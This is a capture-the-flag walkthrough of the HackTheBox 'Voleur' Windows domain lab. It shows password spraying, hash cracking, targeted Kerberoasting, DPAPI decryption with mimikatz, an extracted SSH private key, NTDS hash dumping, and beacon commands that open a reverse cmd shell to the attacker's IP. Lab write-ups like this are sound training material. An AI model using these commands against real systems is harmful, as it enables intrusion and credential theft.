---
title: HackTheBox - Voleur
date: 2025-11-1 02:30:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [WriteSPN, dpapi]     
image : assets/images/635619778e50cc8f69df91cc6ae149c4-1.png
---

```bash
 Machine Information As is common in real life Windows pentests, you will start the Voleur box 
with credentials for the following account: ryan.naylor / HollowOct31Nyt
```

## Entry

i will do nmap scan first 

### nmap

```bash
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-06 05:45:43Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2222/tcp open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

```

### Enum

I will start with nxc since its common AD box.

```bash
➜  voleur nxc smb 10.10.11.76
SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
➜  voleur nxc ldap 10.10.11.76                              
LDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb)
➜  voleur sudo vim /etc/hosts
➜  voleur cat /etc/hosts
[SNIP]
10.10.11.76     DC.voleur.htb voleur.htb DC
```

Lets check our entry creds if will work smb and ldap.

![alt text](../assets/images/voleur1.png)

i will check `--users` module from netexec cause maybe some misconfiguration or description which is interesting.

```bash
faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --users
```

![alt text](../assets/images/voleur2.png)

okey something interesting but not what i want fully so i will create username list and do password spray.

```bash
➜  voleur cat nxcusers.txt | awk '{print $5}' > users.txt
➜  voleur cat users.txt 
Administrator
Guest
krbtgt
ryan.naylor
marie.bryant
lacey.miller
svc_ldap
svc_backup
svc_iis
jeremy.combs
svc_winrm
```

![alt text](../assets/images/voleur3.png)

### Bloodhound

i will check if we have **LDAP** access so we can dump Bloodhound data.

```bash
faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc ldap DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --bloodhound --dns-server 10.10.11.76 --collection All
```

![alt text](../assets/images/voleur4.png)

Lets upload them and analyze.

![alt text](../assets/images/voleur5.png)

Nothing special yet lets check **shares** cause i totally forgot nowadays HTB default AD box are just dump BH data and bla bla.

### shares

```bash
faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
```

![alt text](../assets/images/voleur6.png)

we have **READ** access on **IT** shares so lets check this first

```bash
faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k -M spider_plus
```

and i found interesting file

```bash
➜  voleur cat /home/elliot/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json
{
    "IT": {
        "First-Line Support/Access_Review.xlsx": {
            "atime_epoch": "2025-01-31 04:09:27",
            "ctime_epoch": "2025-01-29 04:39:51",
            "mtime_epoch": "2025-05-29 18:23:36",
            "size": "16.5 KB"

```

Lets grab it with netexec also

```bash
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True
```

and here

```bash
➜  voleur ls -la /home/elliot/.nxc/modules/nxc_spider_plus/DC.voleur.htb/IT/First-Line\ Support/Access_Review.xlsx 
-rw-rw-r-- 1 elliot elliot 16896 Jul  5 18:06 '/home/elliot/.nxc/modules/nxc_spider_plus/DC.voleur.htb/IT/First-Line Support/Access_Review.xlsx'
```

![alt text](../assets/images/voleur7.png)

okey we have to decyrpt it.

```bash
➜  voleur office2john Access_Review.xlsx > xlsxfile_hash
➜  voleur john xlsxfile_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)
```

and lets open it.

![alt text](../assets/images/voleur8.png)

and yeah we found some password here. it says todd wolfe account is deleted but maybe someone using his password as passwod. (no success)

There was only svc_ldap and svc_iis password work for them directly

```bash
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc smb DC.voleur.htb -u users.txt -p 'M1XyC9pW7qT5Vn' -k --continue-on-success
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\Administrator:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\Guest:M1XyC9pW7qT5Vn KDC_ERR_CLIENT_REVOKED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\krbtgt:M1XyC9pW7qT5Vn KDC_ERR_CLIENT_REVOKED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\ryan.naylor:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\marie.bryant:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\lacey.miller:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\svc_backup:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\svc_iis:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\jeremy.combs:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\svc_winrm:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED 
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc smb DC.voleur.htb -u users.txt -p 'N5pXyW1VqM7CZ8' -k --continue-on-success
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\Administrator:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\Guest:N5pXyW1VqM7CZ8 KDC_ERR_CLIENT_REVOKED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\krbtgt:N5pXyW1VqM7CZ8 KDC_ERR_CLIENT_REVOKED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\ryan.naylor:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\marie.bryant:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\lacey.miller:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\svc_ldap:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\svc_backup:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\jeremy.combs:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
SMB         DC.voleur.htb   445    DC               [-] voleur.htb\svc_winrm:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED 
```

![alt text](../assets/images/voleur9.png)

okey its seems like interesting.

![alt text](../assets/images/voleur10.png)

okey its seems like we can grab user.txt with it.

![alt text](../assets/images/voleur11.png)

### WriteSPN

first lets get him TGT and export it

```bash
faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" getTGT.py voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn'
export KRB5CCNAME=svc_ldap.ccache 
```

and now lets run it ([targetekkerberoast](https://github.com/ShutdownRepo/targetedKerberoast))

```bash
faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" python3 targetedKerberoast.py -k --dc-host DC.voleur.htb -u 'svc_ldap' -d voleur.htb
```

![alt text](../assets/images/voleur12.png)

anddd we got it lets try to crack them.

```bash
➜  voleur vim svc_winrm.hash
➜  voleur john svc_winrm.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?) 
```

lets grab user.txt ;)

```bash
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" getTGT.py voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'               
[*] Saving ticket in svc_winrm.ccache
```

and modify /etc/krb5.conf

```bash
[libdefaults]
        default_realm = VOLEUR.HTB
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        fcc-mit-ticketflags = true
        dns_canonicalize_hostname = false
        dns_lookup_realm = false
        dns_lookup_kdc = true
        k5login_authoritative = false
[realms]
        VOLEUR.HTB = {
                kdc = voleur.htb
                admin_server = voleur.htb
                default_admin = voleur.htb
        }
[domain_realm]
        .voleur.htb = VOLEUR.HTB
```

abd boommmmm

```bash
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" evil-winrm -r voleur.htb -i dc.voleur.htb                       

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_winrm> cd Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
9c8940d1129bb11f34c0397cf44e200a
```

i will load my beacon fastlyy.

https://github.com/lineeralgebra/shellcoderunner

i will use my loader here.

```bash
➜  shellcoderunner git:(main) ✗ python3 xor.py a.bin mysecretkey --compile
[+] NTAPI-based C++ runner saved to shellcode_runner.cpp
[*] Compiling shellcode_runner.cpp to runner.exe...
[+] Compilation successful: runner.exe
```

![alt text](../assets/images/voleur13.png)

i will fuzzing some directories first.

![alt text](../assets/images/voleur14.png)

okey maybe its about svc_winrm is not part of this group

![alt text](../assets/images/voleur15.png)

we have **svc_ldap** user creds we can create beacon.

```bash
[07/05 19:54:12] beacon> execute-assembly /home/elliot/tools/RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "cmd.exe" -r 10.10.14.36:1433
[07/05 19:54:12] [*] Tasked beacon to run .NET program: RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "cmd.exe" -r 10.10.14.36:1433
[07/05 19:54:12] [+] host called home, sent: 161062 bytes
[07/05 19:54:14] [+] received output:
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5d163d$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2300 created in background.
```

and lets load beacon

![alt text](../assets/images/voleur16.png)

and its same

btw i realized something….. with our xlsx file theree was a user and he was deleted lets see if we can restore it cause svc_ldap is member of this group.

![alt text](../assets/images/voleur17.png)

nice!!! lets check it. i think we can do with svc_ldap’s beacon directly

```jsx
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```

and now it will work

```bash
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc smb DC.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' --continue-on-success
SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\todd.wolfe:NightT1meP1dg3on14 STATUS_NOT_SUPPORTED 
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc smb DC.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k --continue-on-success
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14 
```

nice!!! lets dump bloodhound data again.

```bash
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc ldap DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --bloodhound --dns-server 10.10.11.76 --collection All
LDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        DC.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
LDAP        DC.voleur.htb   389    DC               Resolved collection methods: acl, objectprops, localadmin, rdp, group, dcom, psremote, trusts, container, session
LDAP        DC.voleur.htb   389    DC               Using kerberos auth without ccache, getting TGT
LDAP        DC.voleur.htb   389    DC               Done in 00M 18S
LDAP        DC.voleur.htb   389    DC               Compressing output into /home/elliot/.nxc/logs/DC_DC.voleur.htb_2025-07-06_042327_bloodhound.zip
```

![alt text](../assets/images/voleur18.png)

Nice!!! now we have this use at Bloodhound. we can try winrm and load beacon. our laod beacon directly.

```bash
[07/05 20:26:39] beacon> execute-assembly /home/elliot/tools/RunasCs.exe todd.wolfe NightT1meP1dg3on14 "cmd.exe" -r 10.10.14.36:1433
[07/05 20:26:39] [*] Tasked beacon to run .NET program: RunasCs.exe todd.wolfe NightT1meP1dg3on14 "cmd.exe" -r 10.10.14.36:1433
[07/05 20:26:39] [+] host called home, sent: 161074 bytes
[07/05 20:26:40] [+] received output:
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5d163d$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3612 created in background.
```

and hereee

and we are member of SECOND-LINE-IT member.

![alt text](../assets/images/voleur20.png)

and lets check it

![alt text](../assets/images/voleur21.png)

and its remind me something  HackTheBox - Vintage.

![alt text](../assets/images/voleur22.png)

BAM BAM BAM

but we need something more

![alt text](../assets/images/voleur23.png)

Nice lets decypt it

### DPAPI(Cobalt Strike)

```bash
mimikatz dpapi::cred /in:"C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3"
```

![alt text](../assets/images/voleur24.png)

```bash
mimikatz dpapi::masterkey /in:"C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88" /rpc
```

![alt text](../assets/images/voleur25.png)

anddd lets decyrpt it

```bash
mimikatz dpapi::cred /in:"C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3" /masterkey:d2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

![alt text](../assets/images/voleur26.png)

and we got new creds

```bash
➜  voleur faketime "$(ntpdate -q voleur.htb | cut -d ' ' -f 1,2)" nxc smb DC.voleur.htb -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k 
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m 
```

![alt text](../assets/images/voleur27.png)

BAM BAM BAM BAM. letss load beacon and read new dierectories.

```bash
[07/05 20:52:16] beacon> execute-assembly /home/elliot/tools/RunasCs.exe jeremy.combs qT3V9pLXyN7W4m "cmd.exe" -r 10.10.14.36:1433
[07/05 20:52:16] [*] Tasked beacon to run .NET program: RunasCs.exe jeremy.combs qT3V9pLXyN7W4m "cmd.exe" -r 10.10.14.36:1433
[07/05 20:52:16] [+] host called home, sent: 161070 bytes
[07/05 20:52:17] [+] received output:
[*] Warning: The logon for user 'jeremy.combs' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5d163d$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 4896 created in background.
```

AND BAMMMMMMMM

![alt text](../assets/images/voleur28.png)

there is Backups dir but Access denied.

![alt text](../assets/images/voleur29.png)

but we have id_rsa

lets grab it and port 2222 was open lets connect there

```bash
[07/05 20:56:30] beacon> powerpick type "C:\IT\Third-Line Support\id_rsa"
[07/05 20:56:30] [*] Tasked beacon to run: type "C:\IT\Third-Line Support\id_rsa" (unmanaged)
[07/05 20:56:30] [+] host called home, sent: 137984 bytes
[07/05 20:56:33] [+] received output:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

and its work for svc_backup

```bash
`➜  voleur chmod 0600 id_rsa 
➜  voleur ssh svc_backup@dc.voleur.htb -i id_rsa -p 2222
The authenticity of host '[dc.voleur.htb]:2222 ([10.10.11.76]:2222)' can't be established.
ED25519 key fingerprint is SHA256:mKWAEwLTnEN2bJNi7fkc+BZodiXCIiP3ywSLJiZL0ss.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[dc.voleur.htb]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  6 01:59:42 PDT 2025

  System load:    0.52      Processes:             15
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   29%       IPv4 address for eth0: 10.10.11.76
  Swap usage:     2%

363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Jul  5 21:43:22 2025 from 10.10.11.76
 * Starting OpenBSD Secure Shell server sshd                                                                                                          [ OK ] 
svc_backup@DC:~$ 

```

and lets check Backups if we have with svc_backup

```bash
svc_backup@DC:/mnt/c/it/Third-Line Support/Backups$ ls -la
total 0
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 08:11  .
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 08:11  ..
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:49 'Active Directory'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:49  registry
svc_backup@DC:/mnt/c/it/Third-Line Support/Backups$ cd Active\ Directory/
svc_backup@DC:/mnt/c/it/Third-Line Support/Backups/Active Directory$ dir
ntds.dit  ntds.jfm
svc_backup@DC:/mnt/c/it/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm
svc_backup@DC:/mnt/c/it/Third-Line Support/Backups/Active Directory$ cd ..
svc_backup@DC:/mnt/c/it/Third-Line Support/Backups$ cd registry/
svc_backup@DC:/mnt/c/it/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM
```

Lets download them.

```jsx
➜  Backups scp -i id_rsa -P 2222 'svc_backup@dc.Voleur.htb:/mnt/c/it/Third-Line Support/Backups/registry/SYSTEM' .

SYSTEM                                                                                                                     100%   18MB   1.0MB/s   00:17    
➜  Backups scp -i id_rsa -P 2222 'svc_backup@dc.Voleur.htb:/mnt/c/it/Third-Line Support/Backups/registry/SECURITY' .

SECURITY                                                                                                                   100%   32KB 130.3KB/s   00:00    
➜  Backups scp -i id_rsa -P 2222 'svc_backup@dc.Voleur.htb:/mnt/c/it/Third-Line Support/Backups/Active Directory/ntds.dit' .

ntds.dit  
```

Lets dump everything.

## Full-Dump

```bash
➜  Backups secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250523.184829.f2f2b367', 'secretsdump.py')
Impacket v0.13.0.dev0+20250523.184829.f2f2b367 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM 
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
